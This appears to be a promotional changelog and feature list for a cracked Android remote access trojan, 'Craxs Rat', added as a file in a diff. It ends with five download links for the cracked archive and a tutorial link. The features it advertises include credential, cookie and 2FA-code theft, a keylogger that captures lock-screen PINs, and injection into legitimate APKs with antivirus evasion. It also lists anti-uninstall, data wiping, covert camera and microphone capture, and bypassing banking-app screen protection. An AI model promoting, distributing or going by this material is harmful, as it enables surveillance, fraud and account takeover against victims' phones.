@@ -1,0 +1,217 @@
+Craxs Rat CRACK Update
+ 
+ 
+[NEW] Automatic Screen unlock, Support
+ 
+Pin Code
+ 
+Password
+ 
+[NEW] option on builder:
+ 
+Background data usage: to allow the app to use the internet on a metered network
+ 
+[Update] Password capture general improvements
+ 
+[Update] Improve link detection for password capture
+ 
+[Update] Screen Reader can send text, like live screen
+ 
+[Update] Fix applications manager bug
+ 
+[Update] Fix Xiaomi miui auto start bugs
+ 
+[Update] Fix admin permission can’t be enabled on some Xiaomi Miui phones
+ 
+[General] Bug Fixes & Performance Improvements
+ 
+Craxs Rat Update V5
+ 
+[NEW] Automated Injection: select the target APK, and Craxs Injector will handle all necessary tasks
+ 
+[NEW] APK Signature Key
+ 
+[NEW] Enhanced User Interface: Translation + Tips
+ 
+[NEW] Online/Live Translation: Craxs Rat Connect with “Google Translator” to provide interface translation.
+ 
+[NEW] Passwords Detector/Capture: will help you Capture and save login info such as [email, passwords, cookies,etc..] from the website list you select supported browsers : -Samsung Internet Browser
+ 
+Google Chrome
+ 
+Mozilla Firefox
+ 
+Microsoft Edge
+ 
+Samsung Internet
+ 
+Opera Browser
+ 
+DuckDuckGo Private Browser
+ 
+Brave Browser
+ 
+ColorOS Internet Browser
+ 
+Dolphin Browser
+ 
+PLUS: Support any app id (package name)
+ 
+[NEW] update And Rework for option BIND:
+ 
+automatically detect target APK name And ID (package name)
+ 
+customizable screen to install binded/Meraged application
+ 
+rework, now First request Accessibility if needed, Then install binded/Meraged app
+ 
+[NEW] “VIP Notification” has been replaced with a custom notification system.
+ 
+[Update] Live Screen Block Mode works with low-quality
+ 
+[General] Bug Fixes & Performance Improvements For Rat & Apk
+ 
+CraxsRat V4 New Update
+ 
+GENERAL:
+New interface better / Easier / bigger
+Edit connections info to support Multiple clients at once
+major improvement and Bug fixes
+More Stable + Longer Connection
+Auto Clicker Faster/Smoother
+Builder Now Shows error in case Found
+apk is fud again
+LiveScreen:
+screen Control x10 Faster
+ 
+New Block Mode: allow disable user touch and block view with black screen to hide sensitive info during remote control
+ 
+Screen Monitor: Show Lock Screen Without Screen Shot
+ 
+Screen Reader: Support Screen Control – Update Camera now you can: – Set Camera Resolution – Set Camera Quality
+ 
+-Update Microphone: -Start/Stop Record + Record Saved on phone -get a recorder from the call recorder -fix call recorder
+ 
+-Custome Apps fully Support Rotate screen -builder add more fake apps option -show if the device is admin.
+ 
+𝗙𝗶𝗹𝗲 𝗠𝗮𝗻𝗮𝗴𝗲𝗿
+ 
+Download/Upload
+Secure Delete Options
+Thumbnail/Gallery view
+Advanced search
+Copy/Paste
+Decrypt/Decode
+Hidden / Unhidden File
+Set WallPaper
+𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻
+Live Location
+𝗟𝗶𝘃𝗲 𝗦𝗰𝗿𝗲𝗲𝗻 𝗖𝗼𝗻𝘁𝗿𝗼𝗹
+Show Screen Live
+Control Screen (VNC)
+Use Keyboard
+Lock/unlock screen
+Take a silent screenshot
+𝗖𝗮𝗹𝗹 𝗠𝗮𝗻𝗮𝗴𝗲𝗿
+Show List Of Call Out /in
+Delete calls
+𝗦𝗲𝗻𝗱 𝗦𝗠𝗦
+Improve “Send SMS”
+Send to multi number
+Send to list from file
+Send to all contact
+𝗔𝗽𝗽𝗹𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗠𝗮𝗻𝗮𝗴𝗲𝗿
+Show List of Application
+Open App
+Uninstall App
+Disable / enable the app
+𝗞𝗲𝘆𝗹𝗼𝗴𝗴𝗲𝗿
+Online/Live keylogger
+Offline keylogger
+Save it in the client folder
+Record everything
+even the pin of the screen lock
+𝗦𝗠𝗦 𝗠𝗮𝗻𝗮𝗴𝗲𝗿
+Show a List Of SMS
+Delete SMS
+𝗘𝘅𝘁𝗿𝗮 𝗧𝗼𝗼𝗹𝘀
+Call Number
+Download Apk From the Link
+Show Message On Screen
+Clipboard
+Open Link
+Run Commands
+Social Media Hunter
+Stealer Gmail account
+Stealer Facebook account
+Stealer 2FA Google - Authenticator Code
+𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝗠𝗮𝗻𝗮𝗴𝗲𝗿
+Checking allowed/not allowed Permissions
+Request Permission from the panel
+Request to enable accessibility
+Draw on the app
+𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗠𝗮𝗻𝗮𝗴𝗲𝗿
+Show Account Of App
+Email/Number
+𝗔𝘂𝘁𝗼 𝗖𝗹𝗶𝗰𝗸𝗲𝗿
+Watch the user Touch on screen
+Record user Touches
+Repeat User Touches
+𝗪𝗲𝗯 𝗕𝗿𝗼𝘄𝘀𝗲𝗿
+Web browser Monitor
+Web browser Html Viewer
+Open the link and browser monitor/record
+𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗶𝗻 𝗿𝗲𝗮𝗹 𝗮𝗽𝗽
+Silent control
+Work like a real app
+Ask for accessibility
+Anti kill
+Anti uninstall
+Support screen wakeup
+Support Permission manager
+Support screenshot
+Support lock screen
+Re-encrypt the apk
+𝗔𝗱𝗺𝗶𝗻 𝗥𝗶𝗴𝗵𝘁𝘀
+Request Admin Rights
+Lock screen
+Wipe Data (delete everything)
+𝗖𝗮𝗺𝗲𝗿𝗮
+Take Screenshot Camera
+Open Fron Camera
+Open Back Camera
+Take Photo
+𝗞𝗲𝘆𝗯𝗼𝗮𝗿𝗱 𝗠𝗮𝗻𝗮𝗴𝗲𝗿 (𝗕𝗲𝘁𝗮)
+Replace phone keyboard with - CraxsRat custom keyboard
+Support 3 languages “English – Arabic – Chinese “
+Record everything entered by the victim
+𝗦𝗲𝗹𝗳 𝗗𝗶𝘀𝘁𝗿𝗮𝗰𝘁𝗶𝗼𝗻
+To remove the apk & data (auto with super mod)
+𝗠𝗶𝗰𝗿𝗼𝗽𝗵𝗼𝗻𝗲 𝗖𝗮𝗽𝘁𝘂𝗿𝗲
+Listen Speak
+Record
+𝗡𝗼𝘁𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗟𝗶𝘀𝘁𝗲𝗻𝗲𝗿
+Get All Notification
+Save it
+𝗖𝗮𝗹𝗹 𝗟𝗶𝘀𝘁𝗲𝗻𝗲𝗿
+Get all call Notification
+Record Incoming / Outgoing calls
+𝗦𝗰𝗿𝗲𝗲𝗻 𝗥𝗲𝗮𝗱𝗲𝗿
+Skeleton view or Scan View
+Bypass the black screen of banks and crypto app
+Add a logo window to copy anything from the screen easily
+ 
+ 
+Option#1- https://filetransfer.io/data-package/tAVHMVdl#link
+ 
+Option#2- https://www.filemail.com/d/fobuzyuounogwmq
+ 
+Option#3- https://mega.nz/file/Bf9QRCaI#OHvnlKlJsl8UWCrIMCW8t5KKSpDjPSEjGwgx0BQ6hMk
+ 
+Option#4- https://www.transfernow.net/dl/20231119dC7sVTlQ
+ 
+Option#5- https://www.mediafire.com/file/sg3bk9ixjud4659/CraxsRat_V6.7.rar/file
+ 
+------------------------------------------------------
+ 
+TUTORIAL: https://youtu.be/qrYu_nLq6qU?si=uYilnBhO-M2AyPDB
